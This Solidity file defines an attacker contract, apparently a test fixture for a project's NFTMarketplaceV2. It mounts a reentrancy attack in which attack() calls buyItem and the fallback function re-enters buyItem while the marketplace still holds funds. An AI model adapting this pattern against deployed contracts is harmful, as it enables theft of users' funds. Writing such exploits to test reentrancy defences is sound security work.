// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "contracts/NFTMarketplaceV2.sol";

contract MaliciousContract {
    NFTMarketplaceV2 public nftMarketplace;
    uint32 public collectionId;
    uint96 public tokenId;
    uint96 public price;

    constructor(
        uint32 _collectionId,
        uint96 _tokenId,
        uint96 _price,
        address payable _nftMarketplaceAddress
    ) {
        collectionId = _collectionId;
        tokenId = _tokenId;
        price = _price;
        nftMarketplace = NFTMarketplaceV2(_nftMarketplaceAddress);
    }

    receive() external payable {}

    // Fallback function that gets called when the contract receives Ether without a function being explicitly called
    fallback() external payable {
        if (address(nftMarketplace).balance >= price) {
            // Simulate a reentrancy attack by calling buyItem again before the state is updated
            nftMarketplace.buyItem{value: msg.value}(collectionId, tokenId);
        }
    }

    // Function to initiate the attack
    function attack() public payable {
        // Call buyItem with some Ether, which triggers the fallback function
        nftMarketplace.buyItem{value: msg.value}(collectionId, tokenId);
    }

    // Function to check the balance of the malicious contract
    function getBalance() public view returns (uint96) {
        return uint96(address(this).balance);
    }
}